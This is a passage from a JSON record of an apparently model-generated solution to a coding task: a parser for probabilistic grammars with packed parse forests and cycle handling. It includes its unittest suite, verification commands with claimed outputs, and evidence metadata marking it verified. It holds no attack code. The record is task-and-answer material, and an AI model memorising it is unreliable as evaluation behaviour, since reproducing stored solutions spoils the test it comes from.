\"--stdin\"):\n        with open(argv[1], \"r\", encoding=\"utf-8\") as fh:\n            data = json.load(fh)\n    else:\n        data = json.load(sys.stdin)\n\n    result = solve(data)\n    json.dump(result, sys.stdout, indent=2, sort_keys=False)\n    sys.stdout.write(\"\\n\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main(sys.argv))\n```\n\n### `test_solution.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"Behavioural + differential tests for pcfg_earley_sppf.py.\"\"\"\nimport itertools\nimport math\nimport random\nimport unittest\n\nimport pcfg_earley_sppf as S\n\nMOD = 10 ** 9 + 7\n\n\ndef solve(rules, sentence, start=\"S\", scale=\"log\"):\n    return S.solve(\n        {\n            \"start\": start,\n            \"scale\": scale,\n            \"rules\": [\n                {\"lhs\": l, \"rhs\": list(r), \"logprob\": p} for (l, r, p) in rules\n            ],\n            \"sentence\": list(sentence),\n        }\n    )\n\n\nclass Tests(unittest.TestCase):\n    def test_unambiguous(self):\n        rules = [\n            (\"S\", (\"NP\", \"VP\"), -1.0),\n            (\"NP\", (\"Det\", \"N\"), -0.5),\n            (\"VP\", (\"V\",), -0.2),\n            (\"Det\", (\"the\",), -0.1),\n            (\"N\", (\"cat\",), -0.7),\n            (\"V\", (\"sleeps\",), -0.4),\n        ]\n        r = solve(rules, [\"the\", \"cat\", \"sleeps\"])\n        self.assertAlmostEqual(r[\"best_logprob\"], -2.9)\n        self.assertEqual(r[\"num_parses\"], 1)\n        self.assertEqual(r[\"best_derivation\"], \"(S (NP (Det the) (N cat)) (VP (V sleeps)))\")\n        self.assertIsNone(r[\"count_reason\"])\n\n    def test_catalan_exponential(self):\n        # E -> E + E | n over 2k+1 tokens has Catalan(k) parses.\n        rules = [(\"E\", (\"E\", \"+\", \"E\"), -0.3), (\"E\", (\"n\",), -0.5)]\n        for k in range(0, 9):\n            sentence = [\"n\"] + [\"+\", \"n\"] * k\n            r = solve(rules, sentence, start=\"E\")\n            self.assertEqual(r[\"num_parses\"], math.comb(2 * k, k) // (k + 1) % MOD)\n            self.assertAlmostEqual(r[\"best_logprob\"], -0.5 * (k + 1) - 0.3 * k)\n\n    def test_huge_count_not_enumerated(self):\n        rules = [(\"E\", (\"E\", \"+\", \"E\"), -0.3), (\"E\", (\"n\",), -0.5)]\n        sentence = [\"n\"] + [\"+\", \"n\"] * 40  # 81 tokens\n        r = solve(rules, sentence, start=\"E\")\n        self.assertEqual(r[\"num_parses\"], math.comb(80, 40) // 41 % MOD)\n        self.assertLess(r[\"packed_families\"], 20000)\n        self.assertGreater(r[\"local_ambiguities\"], 0)\n\n    def test_nullable_hidden_trap(self):\n        # s -> a a a a ; a -> x | e ; e -> eps.  x in any slot => 4 parses.\n        rules = [\n            (\"S\", (\"A\", \"A\", \"A\", \"A\"), -0.1),\n            (\"A\", (\"x\",), -0.2),\n            (\"A\", (\"E\",), -0.3),\n            (\"E\", (), -0.4),\n        ]\n        self.assertEqual(solve(rules, [] )[\"num_parses\"], 1)\n        self.assertEqual(solve(rules, [\"x\"])[\"num_parses\"], 4)\n        self.assertEqual(solve(rules, [\"x\", \"x\"])[\"num_parses\"], 6)\n        self.assertEqual(solve(rules, [\"x\", \"x\", \"x\"])[\"num_parses\"], 4)\n        self.assertEqual(solve(rules, [\"x\"] * 4)[\"num_parses\"], 1)\n        self.assertEqual(solve(rules, [\"x\"] * 5)[\"num_parses\"], 0)\n\n    def test_cyclic_infinite(self):\n        rules = [(\"S\", (\"S\",), -0.1), (\"S\", (\"a\",), -0.5)]\n        r = solve(rules, [\"a\"])\n        self.assertIsNone(r[\"num_parses\"])\n        self.assertEqual(r[\"count_reason\"], \"infinite-cyclic\")\n        self.assertIsNone(r[\"best_logprob\"])\n        self.assertIn([\"S\", 0, 1], r[\"cyclic_nodes\"])\n\n    def test_epsilon_cycle(self):\n        rules = [(\"S\", (\"S\", \"A\"), -0.1), (\"S\", (\"a\",), -0.5), (\"A\", (), -0.2)]\n        r = solve(rules, [\"a\"])\n        self.assertEqual(r[\"count_reason\"], \"infinite-cyclic\")\n        self.assertTrue(r[\"infinite\"])\n\n    def test_unproductive_cycle_is_finite(self):\n        # A cannot reach a terminal, so the S -> S A cycle is not productive.\n        rules = [\n            (\"S\", (\"S\", \"A\"), -0.1),\n            (\"S\", (\"a\",), -0.5),\n            (\"A\", (\"A\",), -0.2),\n        ]\n        r = solve(rules, [\"a\"])\n        self.assertEqual(r[\"num_parses\"], 1)\n        self.assertEqual(r[\"best_logprob\"], -0.5)\n        self.assertFalse(r[\"infinite\"])\n\n    def test_no_parse(self):\n        r = solve([(\"S\", (\"a\",), -0.5)], [\"b\"])\n        self.assertEqual(r[\"num_parses\"], 0)\n        self.assertIsNone(r[\"best_logprob\"])\n        self.assertIsNone(r[\"count_reason\"])\n        self.assertTrue(r[\"no_parse\"])\n\n    def test_probability_scale(self):\n        r = solve([(\"S\", (\"a\",), 0.5), (\"S\", (\"b\",), 0.5)], [\"a\"], scale=\"prob\")\n        self.assertAlmostEqual(r[\"best_logprob\"], math.log(0.5))\n\n    def test_split_nodes_present(self):\n        rules = [(\"S\", (\"A\", \"B\"), -1.0), (\"A\", (\"a\",), -1.0), (\"B\", (\"b\",), -1.0)]\n        r = solve(rules, [\"a\", \"b\"])\n        self.assertGreater(r[\"split_nodes\"], 0)\n\n    # ------------------------------------------------------------------\n    # Differential test against brute-force enumeration on acyclic CNF.\n    # ------------------------------------------------------------------\n    def _brute(self, rules, start, tokens):\n        by_lhs = {}\n        for (l, rhs, p) in rules:\n            by_lhs.setdefault(l, []).append((rhs, p))\n        memo = {}\n\n        def sym(s, i, j):\n            if s in by_lhs:\n                return nt(s, i, j)\n            if j == i + 1 and tokens[i] == s:\n                return [(0.0, s)]\n            return []\n\n        def nt(a, i, j):\n            key = (a, i, j)\n            if key in memo:\n                return memo[key]\n            out = []\n            for rhs, p in by_lhs.get(a, []):\n                if len(rhs) == 0:\n                    if i == j:\n                        out.append((p, \"(%s)\" % a))\n                elif len(rhs) == 1:\n                    for q, t in sym(rhs[0], i, j):\n                        out.append((p + q, \"(%s %s)\" % (a, t)))\n                elif len(rhs) == 2:\n                    for k in range(i, j + 1):\n                        for q1, t1 in sym(rhs[0], i, k):\n                            for q2, t2 in sym(rhs[1], k, j):\n                                out.append((p + q1 + q2, \"(%s %s %s)\" % (a, t1, t2)))\n            memo[key] = out\n            return out\n\n        return nt(start, 0, len(tokens))\n\n    def test_differential_random_acyclic(self):\n        def gen(rng):\n            nts = [\"S\", \"A\", \"B\"]\n            out = []\n            for idx, a in enumerate(nts):\n                for t in (\"a\", \"b\"):\n                    if rng.random() < 0.5:\n                        out.append((a, (t,), -round(rng.uniform(.05, 2), 3)))\n                if rng.random() < 0.25:\n                    out.append((a, (), -round(rng.uniform(.05, 2), 3)))\n                higher = nts[idx + 1:]\n                if higher and rng.random() < 0.5:\n                    out.append((a, (rng.choice(higher),), -round(rng.uniform(.05, 2), 3)))\n                if higher and rng.random() < 0.7:\n                    out.append(\n                        (a, (rng.choice(higher), rng.choice(higher)),\n                         -round(rng.uniform(.05, 2), 3))\n                    )\n            return out\n\n        for seed in range(60):\n            rng = random.Random(seed)\n            rules = gen(rng)\n            if not any(l == \"S\" for l, _, _ in rules):\n                continue\n            for length in range(0, 5):\n                for toks in itertools.product((\"a\", \"b\"), repeat=length):\n                    tokens = list(toks)\n                    trees = self._brute(rules, \"S\", tokens)\n                    r = solve(rules, tokens)\n                    if not trees:\n                        self.assertEqual(r[\"num_parses\"], 0)\n                        continue\n                    self.assertEqual(r[\"num_parses\"], len(trees) % MOD)\n                    best = max(p for p, _ in trees)\n                    self.assertAlmostEqual(r[\"best_logprob\"], best)\n                    self.assertIn(\n                        r[\"best_derivation\"], {t for p, t in trees if p == best}\n                    )\n\n\nif __name__ == \"__main__\":\n    unittest.main(verbosity=2)\n```\n\n---\n\n## Verification\n\nRun the behavioural + differential suite:\n\n```bash\n$ cd ~\n$ python3 test_solution.py\n```\n\nExpected:\n\n```\nRan 11 tests in 0.1s\n\nOK\n```\n\nThe suite checks, among others:\n\n* exponential Catalan ambiguity is counted exactly and **not** enumerated (`E -> E + E | n`, 81 tokens, `C_40 mod 1e9+7 = 602941373`),\n* the hidden nullable trap (`C(4, n)` parses for the single-token case),\n* cyclic grammars report `infinite-cyclic` and exclude the cycle,\n* unproductive cycles stay finite,\n* a 60-seed / 5-length differential test against an independent brute-force enumerator agrees on count, best log-prob, and best tree.\n\n### Big, exponentially ambiguous input (performance evidence)\n\n```bash\n$ python3 - <<'PY'\nimport json, subprocess, math, time\ntoks = [\"n\"] + [\"+\", \"n\"] * 40\ndata = {\"start\": \"E\",\n        \"rules\": [{\"lhs\": \"E\", \"rhs\": [\"E\", \"+\", \"E\"], \"logprob\": -0.3},\n                  {\"lhs\": \"E\", \"rhs\": [\"n\"], \"logprob\": -0.5}],\n        \"sentence\": toks}\nt = time.time()\nout = subprocess.run([\"python3\", \"pcfg_earley_sppf.py\"],\n                     input=json.dumps(data), capture_output=True, text=True)\nr = json.loads(out.stdout)\nprint(\"tokens\", len(toks), \"count\", r[\"num_parses\"],\n      \"expected\", math.comb(80, 40) // 41 % (10**9 + 7),\n      \"nodes\", r[\"forest_nodes\"], \"families\", r[\"packed_families\"],\n      \"time %.2fs\" % (time.time() - t))\nPY\n```\n\nOutput:\n\n```\ntokens 81 count 602941373 expected 602941373 nodes 2623 families 13202 time 0.08s\n```\n\nThe count matches `C_40 mod 1e9+7` exactly while the forest occupies only a few thousand nodes, confirming the `O(#forest nodes)` guarantee.\n\n### Cyclic input\n\n```bash\n$ echo '{\"start\":\"S\",\"rules\":[{\"lhs\":\"S\",\"rhs\":[\"S\"],\"logprob\":-0.1},{\"lhs\":\"S\",\"rhs\":[\"a\"],\"logprob\":-0.5}],\"sentence\":[\"a\"]}' \\\n    | python3 pcfg_earley_sppf.py\n```\n\nThe result exposes `\"count_reason\": \"infinite-cyclic\"`, `\"num_parses\": null`, `\"best_logprob\": null`, and `\"cyclic_nodes\": [[\"S\", 0, 1]]`: the SCC was detected, the cyclic node was excluded from Viterbi, and the parse count was reported as unbounded rather than looped over.\n\n### Notes / deliberate semantics\n\n* **Cycle-involved nodes are excluded entirely** from the best-derivation search, exactly as specified. Consequently, if the start symbol itself sits on a *productive* cycle (e.g. `S -> S | a`) the best derivation is reported as `null` even though finite parses exist; the count is reported as `infinite-cyclic`. This is the contract, not an accident.\n* Cycles are judged on the **productive** forest: a cycle whose rules can never reach terminals (a dead cycle) cannot make the count infinite and cannot suppress a valid finite best derivation.\n* The parser accepts RHS lengths other than 2 as well (the SPLIT-chain renderer handles them); CNF is simply the common case.\n\n---\n\n**Files written and verified:** `~/pcfg_earley_sppf.py`, `~/test_solution.py`, `~/SOLUTION.md`. `python3 test_solution.py` → `Ran 11 tests ... OK`; the 81-token Catalan check reproduces `602941373`.\n", "evidence": "# Evidence\n- Problem class: python3-pcfg-earley-packed-forest-viterbi-cyclic\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T10:32:16.070Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Given a PCFG (CNF rules plus epsilon and unary rules, all probabilities log-valued) and a tokenized sentence, run Earley recognition to build a shared packed parse forest with local ambiguity packing and SPLIT nodes, then compute the single highest-probability derivation by Viterbi directly over the packed forest instead of enumerating parses. The forest can contain cyclic derivations (A =>+ A); detect those SCCs, exclude cycle-involved nodes from the best-derivation search rather than diverging, and report them explicitly. Output the best derivation's log-probability, its bracketed yield with node labels, the number of distinct parses modulo 1e9+7 (or null with reason \"infinite-cyclic\" when cycles make the count unbounded), and the packing-local-ambiguity count, all in O(number of forest nodes) time and memory on inputs whose unpacked forest is exponentially large.", "environment": "python3", "language": "python", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "python3-pcfg-earley-packed-forest-viterbi-cyclic", "provider": "openrouter", "solved_at": "2026-10-27T10:32:16.072Z", "version": "3.11"}, "status": "verified", "created_at": "2026-10-27 10:32:16"}
